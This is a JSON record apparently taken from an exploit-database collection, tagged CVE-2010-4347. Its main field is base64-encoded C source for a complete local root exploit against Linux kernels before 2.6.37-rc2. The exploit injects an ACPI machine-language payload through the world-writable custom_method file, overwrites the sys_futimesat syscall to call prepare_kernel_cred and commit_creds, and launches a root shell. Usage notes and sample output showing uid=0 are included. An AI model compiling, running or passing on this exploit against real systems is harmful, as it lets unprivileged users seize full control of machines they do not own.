{
    "source": "exploit-database", 
    "exploit": "LyoNCiAqIGFtZXJpY2FuLXNpZ24tbGFuZ3VhZ2UuYw0KICoNCiAqIExpbnV4IEtlcm5lbCA8IDIuNi4zNy1yYzIgQUNQSSBjdXN0b21fbWV0aG9kIFByaXZpbGVnZSBFc2NhbGF0aW9uDQogKiBKb24gT2JlcmhlaWRlIDxqb25Ab2JlcmhlaWRlLm9yZz4NCiAqIGh0dHA6Ly9qb24ub2JlcmhlaWRlLm9yZw0KICogDQogKiBJbmZvcm1hdGlvbjoNCiAqDQogKiAgIGh0dHA6Ly9jdmUubWl0cmUub3JnL2NnaS1iaW4vY3ZlbmFtZS5jZ2k/bmFtZT1DVkUtMjAxMC00MzQ3DQogKg0KICogICBUaGlzIGN1c3RvbV9tZXRob2QgZmlsZSBhbGxvd3MgdG8gaW5qZWN0IGN1c3RvbSBBQ1BJIG1ldGhvZHMgaW50byB0aGUgQUNQSQ0KICogICBpbnRlcnByZXRlciB0YWJsZXMuIFRoaXMgY29udHJvbCBmaWxlIHdhcyBpbnRyb2R1Y2VkIHdpdGggd29ybGQgd3JpdGVhYmxlDQogKiAgIHBlcm1pc3Npb25zIGluIExpbnV4IEtlcm5lbCAyLjYuMzMuDQogKg0KICogVXNhZ2U6DQogKiANCiAqICAgJCBnY2MgYW1lcmljYW4tc2lnbi1sYW5ndWFnZS5jIC1vIGFtZXJpY2FuLXNpZ24tbGFuZ3VhZ2UNCiAqICAgJCAuL2FtZXJpY2FuLXNpZ24tbGFuZ3VhZ2UNCiAqICAgWytdIHJlc29sdmluZyByZXF1aXJlZCBzeW1ib2xzLi4uDQogKiAgIFsrXSBjaGVja2luZyBmb3Igd29ybGQtd3JpdGFibGUgY3VzdG9tX21ldGhvZC4uLg0KICogICBbK10gY2hlY2tpbmcgZm9yIGFuIEFDUEkgTElEIGRldmljZS4uLg0KICogICBbK10gcG9pc29uaW5nIEFDUEkgdGFibGVzIHZpYSBjdXN0b21fbWV0aG9kLi4uDQogKiAgIFsrXSB0cmlnZ2VyaW5nIEFDUEkgcGF5bG9hZCB2aWEgTElEIGRldmljZS4uLg0KICogICBbK10gdHJpZ2dlcmluZyBleHBsb2l0IHZpYSBmdXRpbWVzYXQuLi4NCiAqICAgWytdIGxhdW5jaGluZyByb290IHNoZWxsIQ0KICogICAjIGlkDQogKiAgIHVpZD0wKHJvb3QpIGdpZD0wKHJvb3QpIGdyb3Vwcz0wKHJvb3QpDQogKg0KICogTm90ZXM6DQogKg0KICogICBUaGlzIHZ1bG4gYWxsb3dzIHVzIHRvIHdyaXRlIGN1c3RvbSBBQ1BJIG1ldGhvZHMgYW5kIGxvYWQgdGhlbSBpbnRvIHRoZQ0KICogICBrZXJuZWwgYXMgYW4gdW5wcml2aWxlZ2VkIHVzZXIuIFdlIGNvbXBpbGUgc29tZSBmYW5jeSBBU0wgZG93biB0byBBTUwgDQogKiAgIHRoYXQgb3ZlcnJpZGVzIHRoZSBBQ1BJIG1ldGhvZCB1c2VkIHdoZW4gdGhlIHN0YXR1cyBvZiB0aGUgTElEIGRldmljZSBpcyANCiAqICAgcXVlcmllZCAoZWcuICdvcGVuJyBvciAnY2xvc2VkJyBsaWQgb24gYSBsYXB0b3ApLiBXaGVuIHRoZSBtZXRob2QgaXMgDQogKiAgIHRyaWdnZXJlZCwgaXQgb3ZlcmxheXMgYW4gT3BlcmF0aW9uUmVnaW9uIG9uIHRoZSBwaHlzaWNhbCBhZGRyZXNzIHdoZXJlIA0KICogICBzeXNfZnV0aW1lc2F0IGlzIGxvY2F0ZWQgYW5kIG92ZXJ3cml0ZXMgdGhlIG1lbW9yeSB2aWEgdGhlIFN0b3JlIHRvIA0KICogICBlc2NhbGF0ZSBwcml2aWxlZ2VzIHdoZW5ldmVyIHN5c19mdXRpbWVzYXQgaXMgY2FsbGVkLg0KICoNCiAqICAgVGhlIHBheWxvYWQgaXMgNjQtYml0IG9ubHkgYW5kIGRlcGVuZHMgb24gdGhlIGV4aXN0ZW5jZSBvZiBhIExJRCBkZXZpY2UNCiAqICAgKGVnLiBsYXB0b3ApLCBidXQgdGhlIGV4cGxvaXQgd2lsbCBzdGlsbCB0ZWxsIHlvdSBpZiB5b3UncmUgdnVsbmVyYWJsZQ0KICogICByZWdhcmRsZXNzLiBJZiB5b3UgZG9uJ3Qga25vdyBob3cgdG8gd29yayBhcm91bmQgdGhlc2UgbGltaXRhdGlvbnMsIHlvdSANCiAqICAgcHJvYmFibHkgc2hvdWxkbid0IGJlIHJ1bm5pbmcgdGhpcyBpbiB0aGUgZmlyc3QgcGxhY2UuIDotUA0KICoNCiAqICAgUHJvcHMgdG8gdGF2aXNvLCBzcGVuZGVyLCBrZWVzLCBibGlzcywgcGlwYWNzLCB0d2l6LCBzdGVhbHRoLCBhbmQgI2Jyb3ducGFudHMNCiAqLw0KDQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCiNpbmNsdWRlIDxzdGRpbnQuaD4NCiNpbmNsdWRlIDxzdHJpbmcuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KI2luY2x1ZGUgPGZjbnRsLmg+DQojaW5jbHVkZSA8bGltaXRzLmg+DQojaW5jbHVkZSA8aW50dHlwZXMuaD4NCiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4NCiNpbmNsdWRlIDxzeXMvc3RhdC5oPg0KI2luY2x1ZGUgPHN5cy91dHNuYW1lLmg+DQoNCi8qDQogKiBUaGUgQVNMIHBheWxvYWQgbG9va3MgbGlrZToNCiAqDQogKiBEZWZpbml0aW9uQmxvY2sgKCJsaWQuYW1sIiwgIlNTRFQiLCAyLCAiIiwgIiIsIDB4MDAwMDEwMDEpIHsNCiAqICAgTWV0aG9kIChcX1NCLkxJRC5fTElELCAwLCBOb3RTZXJpYWxpemVkKSB7DQogKiAgICAgT3BlcmF0aW9uUmVnaW9uIChLTUVNLCBTeXN0ZW1NZW1vcnksIFBIWUFERFIsIDB4MzkyKQ0KICogICAgIEZpZWxkKEtNRU0sIEFueUFjYywgTm9Mb2NrLCBQcmVzZXJ2ZSkgew0KICogICAgICAgSEFDSywgMHgzOTINCiAqICAgICB9DQogKiAgICAgU3RvcmUgKEJ1ZmZlciAoKSB7DQogKiAgICAgICAweDU1LCAweDQ4LCAweDg5LCAweGU1LCAweDUzLCAweDQ4LCAweDgzLCAweGVjLA0KICogICAgICAgMHgwOCwgMHg0OCwgMHhjNywgMHhjMywgMHgyNCwgMHgyNCwgMHgyNCwgMHgyNCwNCiAqICAgICAgIDB4NDgsIDB4YzcsIDB4YzAsIDB4MjQsIDB4MjQsIDB4MjQsIDB4MjQsIDB4YmYsDQogKiAgICAgICAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweGZmLCAweGQwLCAweDQ4LCAweDg5LA0KICogICAgICAgMHhjNywgMHhmZiwgMHhkMywgMHg0OCwgMHhjNywgMHhjMCwgMHhiNywgMHhmZiwNCiAqICAgICAgIDB4ZmYsIDB4ZmYsIDB4NDgsIDB4ODMsIDB4YzQsIDB4MDgsIDB4NWIsIDB4YzksDQogKiAgICAgICAweGMzIH0sIEhBQ0spDQogKiAgICAgUmV0dXJuIChPbmUpDQogKiAgIH0NCiAqIH0NCiAqIA0KICogRmVlbCBmcmVlIHRvIGBpYXNsIC1kYCB0aGlzIGlzIHlvdSBkb24ndCB0cnVzdCBtZSEgOy0pDQogKi8NCiNkZWZpbmUgUEFZTE9BRF9BTUwgXA0KIlx4NTNceDUzXHg0NFx4NTRceDkwXHgwMFx4MDBceDAwXHgwMlx4M2VceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiIFwNCiJceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDFceDEwXHgwMFx4MDBceDQ5XHg0ZVx4NTRceDRjIiBcDQoiXHgyMVx4MDVceDA5XHgyMFx4MTRceDRiXHgwNlx4NWNceDJmXHgwM1x4NWZceDUzXHg0Mlx4NWZceDRjXHg0OSIgXA0KIlx4NDRceDVmXHg1Zlx4NGNceDQ5XHg0NFx4MDBceDViXHg4MFx4NGJceDRkXHg0NVx4NGRceDAwXHgwY1x4ZTAiIFwNCiJceDYxXHgxN1x4MDFceDBiXHg5Mlx4MDNceDViXHg4MVx4MGNceDRiXHg0ZFx4NDVceDRkXHgwMFx4NDhceDQxIiBcDQoiXHg0M1x4NGJceDQyXHgzOVx4NzBceDExXHgzNFx4MGFceDMxXHg1NVx4NDhceDg5XHhlNVx4NTNceDQ4XHg4MyIgXA0KIlx4ZWNceDA4XHg0OFx4YzdceGMzXHgyNFx4MjRceDI0XHgyNFx4NDhceGM3XHhjMFx4MjRceDI0XHgyNFx4MjQiIFwNCiJceGJmXHgwMFx4MDBceDAwXHgwMFx4ZmZceGQwXHg0OFx4ODlceGM3XHhmZlx4ZDNceDQ4XHhjN1x4YzBceGI3IiBcDQoiXHhmZlx4ZmZceGZmXHg0OFx4ODNceGM0XHgwOFx4NWJceGM5XHhjM1x4NDhceDQxXHg0M1x4NGJceGE0XHgwMSINCiNkZWZpbmUgUEFZTE9BRF9MRU4gMTQ0DQoNCiNkZWZpbmUgQ1VTVE9NX01FVEhPRCAiL3N5cy9rZXJuZWwvZGVidWcvYWNwaS9jdXN0b21fbWV0aG9kIg0KI2RlZmluZSBIRVlfSVRTX0FfTElEICIvcHJvYy9hY3BpL2J1dHRvbi9saWQvTElEL3N0YXRlIg0KDQp1bnNpZ25lZCBsb25nDQpnZXRfc3ltYm9sKGNoYXIgKm5hbWUpDQp7DQoJRklMRSAqZjsNCgl1bnNpZ25lZCBsb25nIGFkZHI7DQoJY2hhciBkdW1teTsNCgljaGFyIHNuYW1lWzUxMl07DQoJc3RydWN0IHV0c25hbWUgdmVyOw0KCWludCByZXQ7DQoJaW50IHJlcCA9IDA7DQoJaW50IG9sZHN0eWxlID0gMDsNCiANCglmID0gZm9wZW4oIi9wcm9jL2thbGxzeW1zIiwgInIiKTsNCglpZiAoZiA9PSBOVUxMKSB7DQoJCWYgPSBmb3BlbigiL3Byb2Mva3N5bXMiLCAiciIpOw0KCQlpZiAoZiA9PSBOVUxMKQ0KCQkJZ290byBmYWxsYmFjazsNCgkJb2xkc3R5bGUgPSAxOw0KCX0NCiANCnJlcGVhdDoNCglyZXQgPSAwOw0KCXdoaWxlKHJldCAhPSBFT0YpIHsNCgkJaWYgKCFvbGRzdHlsZSkNCgkJCXJldCA9IGZzY2FuZihmLCAiJXAgJWMgJXNcbiIsICh2b2lkICoqKSZhZGRyLCAmZHVtbXksIHNuYW1lKTsNCgkJZWxzZSB7DQoJCQlyZXQgPSBmc2NhbmYoZiwgIiVwICVzXG4iLCAodm9pZCAqKikmYWRkciwgc25hbWUpOw0KCQkJaWYgKHJldCA9PSAyKSB7DQoJCQkJY2hhciAqcDsNCgkJCQlpZiAoc3Ryc3RyKHNuYW1lLCAiX08vIikgfHwgc3Ryc3RyKHNuYW1lLCAiX1MuIikpDQoJCQkJCWNvbnRpbnVlOw0KCQkJCXAgPSBzdHJyY2hyKHNuYW1lLCAnXycpOw0KCQkJCWlmIChwID4gKChjaGFyICopc25hbWUgKyA1KSAmJiAhc3RybmNtcChwIC0gMywgInNtcCIsIDMpKSB7DQoJCQkJCXAgPSBwIC0gNDsNCgkJCQkJd2hpbGUgKHAgPiAoY2hhciAqKXNuYW1lICYmICoocCAtIDEpID09ICdfJykNCgkJCQkJCXAtLTsNCgkJCQkJKnAgPSAnXDAnOw0KCQkJCX0NCgkJCX0NCgkJfQ0KCQlpZiAocmV0ID09IDApIHsNCgkJCWZzY2FuZihmLCAiJXNcbiIsIHNuYW1lKTsNCgkJCWNvbnRpbnVlOw0KCQl9DQoJCWlmICghc3RyY21wKG5hbWUsIHNuYW1lKSkgew0KCQkJZmNsb3NlKGYpOw0KCQkJcmV0dXJuIGFkZHI7DQoJCX0NCgl9DQogDQoJZmNsb3NlKGYpOw0KCWlmIChyZXApDQoJCXJldHVybiAwOw0KZmFsbGJhY2s6DQoJdW5hbWUoJnZlcik7DQoJaWYgKHN0cm5jbXAodmVyLnJlbGVhc2UsICIyLjYiLCAzKSkNCgkJb2xkc3R5bGUgPSAxOw0KCXNwcmludGYoc25hbWUsICIvYm9vdC9TeXN0ZW0ubWFwLSVzIiwgdmVyLnJlbGVhc2UpOw0KCWYgPSBmb3BlbihzbmFtZSwgInIiKTsNCglpZiAoZiA9PSBOVUxMKQ0KCQlyZXR1cm4gMDsNCglyZXAgPSAxOw0KCWdvdG8gcmVwZWF0Ow0KfQ0KDQppbnQNCm1haW4oaW50IGFyZ2MsIGNoYXIgKiphcmd2KQ0Kew0KCWludCByZXQ7DQoJRklMRSAqZnA7DQoJY2hhciBidWZbNjRdOw0KCXN0cnVjdCBzdGF0IHNiOw0KCWNoYXIgcGF5bG9hZFtQQVlMT0FEX0xFTl0gPSBQQVlMT0FEX0FNTDsNCgl1bnNpZ25lZCBsb25nIHN5c19mdXRpbWVzYXQsIHByZXBhcmVfa2VybmVsX2NyZWQsIGNvbW1pdF9jcmVkczsNCg0KCXByaW50ZigiWytdIHJlc29sdmluZyByZXF1aXJlZCBzeW1ib2xzLi4uXG4iKTsNCg0KCXN5c19mdXRpbWVzYXQgPSBnZXRfc3ltYm9sKCJzeXNfZnV0aW1lc2F0Iik7DQoJaWYgKCFzeXNfZnV0aW1lc2F0KSB7DQoJCXByaW50ZigiWy1dIHN5c19mdXRpbWVzYXQgc3ltYm9sIG5vdCBmb3VuZCwgYWJvcnRpbmchXG4iKTsNCgkJZXhpdCgxKTsNCgl9DQoNCglwcmVwYXJlX2tlcm5lbF9jcmVkID0gZ2V0X3N5bWJvbCgicHJlcGFyZV9rZXJuZWxfY3JlZCIpOw0KCWlmICghcHJlcGFyZV9rZXJuZWxfY3JlZCkgew0KCQlwcmludGYoIlstXSBwcmVwYXJlX2tlcm5lbF9jcmVkIHN5bWJvbCBub3QgZm91bmQsIGFib3J0aW5nIVxuIik7DQoJCWV4aXQoMSk7DQoJfQ0KDQoJY29tbWl0X2NyZWRzID0gZ2V0X3N5bWJvbCgiY29tbWl0X2NyZWRzIik7DQoJaWYgKCFjb21taXRfY3JlZHMpIHsNCgkJcHJpbnRmKCJbLV0gY29tbWl0X2NyZWRzIHN5bWJvbCBub3QgZm91bmQsIGFib3J0aW5nIVxuIik7DQoJCWV4aXQoMSk7DQoJfQ0KDQoJcHJpbnRmKCJbK10gY2hlY2tpbmcgZm9yIHdvcmxkLXdyaXRhYmxlIGN1c3RvbV9tZXRob2QuLi5cbiIpOw0KDQoJcmV0ID0gc3RhdChDVVNUT01fTUVUSE9ELCAmc2IpOw0KCWlmIChyZXQgPCAwKSB7DQoJCXByaW50ZigiWy1dIGN1c3RvbV9tZXRob2Qgbm90IGZvdW5kLCBrZXJuZWwgaXMgbm90IHZ1bG5lcmFibGUhXG4iKTsNCgkJZXhpdCgxKTsNCgl9DQoNCglpZiAoIShzYi5zdF9tb2RlICYgU19JV09USCkpIHsNCgkJcHJpbnRmKCJbLV0gY3VzdG9tX21ldGhvZCBub3Qgd29ybGQtd3JpdGFibGUsIGtlcm5lbCBpcyBub3QgdnVsbmVyYWJsZSFcbiIpOw0KCQlleGl0KDEpOw0KCX0NCg0KCXByaW50ZigiWytdIGNoZWNraW5nIGZvciBhbiBBQ1BJIExJRCBkZXZpY2UuLi5cbiIpOw0KDQoJcmV0ID0gc3RhdChIRVlfSVRTX0FfTElELCAmc2IpOw0KCWlmIChyZXQgPCAwKSB7DQoJCXByaW50ZigiWy1dIEFDUEkgTElEIGRldmljZSBub3QgZm91bmQsIGJ1dCBrZXJuZWwgaXMgc3RpbGwgdnVsbmVyYWJsZSFcbiIpOw0KCQlleGl0KDEpOw0KCX0NCg0KCWlmIChzaXplb2Yoc3lzX2Z1dGltZXNhdCkgIT0gOCkgew0KCQlwcmludGYoIlstXSBwYXlsb2FkIGlzIDY0LWJpdCBvbmx5LCBidXQga2VybmVsIGlzIHN0aWxsIHZ1bG5lcmFibGUhXG4iKTsNCgkJZXhpdCgxKTsNCgl9DQoNCglzeXNfZnV0aW1lc2F0ICY9IH4weGZmZmZmZmZmODAwMDAwMDA7DQoJbWVtY3B5KCZwYXlsb2FkWzYzXSwgJnN5c19mdXRpbWVzYXQsIDQpOw0KCW1lbWNweSgmcGF5bG9hZFsxMDFdLCAmY29tbWl0X2NyZWRzLCA0KTsNCgltZW1jcHkoJnBheWxvYWRbMTA4XSwgJnByZXBhcmVfa2VybmVsX2NyZWQsIDQpOw0KDQoJcHJpbnRmKCJbK10gcG9pc29uaW5nIEFDUEkgdGFibGVzIHZpYSBjdXN0b21fbWV0aG9kLi4uXG4iKTsNCg0KCWZwID0gZm9wZW4oQ1VTVE9NX01FVEhPRCwgInciKTsNCglmd3JpdGUocGF5bG9hZCwgMSwgc2l6ZW9mKHBheWxvYWQpLCBmcCk7DQoJZmNsb3NlKGZwKTsNCg0KCXByaW50ZigiWytdIHRyaWdnZXJpbmcgQUNQSSBwYXlsb2FkIHZpYSBMSUQgZGV2aWNlLi4uXG4iKTsNCg0KCWZwID0gZm9wZW4oSEVZX0lUU19BX0xJRCwgInIiKTsNCglmcmVhZCgmYnVmLCAxLCBzaXplb2YoYnVmKSwgZnApOw0KCWZjbG9zZShmcCk7DQoNCglwcmludGYoIlsrXSB0cmlnZ2VyaW5nIGV4cGxvaXQgdmlhIGZ1dGltZXNhdC4uLlxuIik7DQoNCglyZXQgPSBmdXRpbWVzYXQoMCwgIi90bXAiLCBOVUxMKTsNCg0KCWlmIChyZXQgIT0gLTEgfHwgZXJybm8gIT0gRURPVERPVCkgew0KCQlwcmludGYoIlstXSB1bmV4cGVjdGVkIGZ1dGltZXNhdCBlcnJubywgZXhwbG9pdCBmYWlsZWQhXG4iKTsNCgkJZXhpdCgxKTsNCgl9DQoNCglpZiAoZ2V0dWlkKCkgIT0gMCkgew0KCQlwcmludGYoIlstXSBwcml2aWxlZ2VzIG5vdCBlc2NhbGF0ZWQsIGV4cGxvaXQgZmFpbGVkIVxuIik7DQoJCWV4aXQoMSk7DQoJfQ0KDQoJcHJpbnRmKCJbK10gbGF1bmNoaW5nIHJvb3Qgc2hlbGwhXG4iKTsNCglleGVjbCgiL2Jpbi9zaCIsICIvYmluL3NoIiwgTlVMTCk7DQp9", 
    "filename": "platforms/linux/local/15774.c", 
    "id": "15774", 
    "cves": [
        "CVE-2010-4347"
    ]
}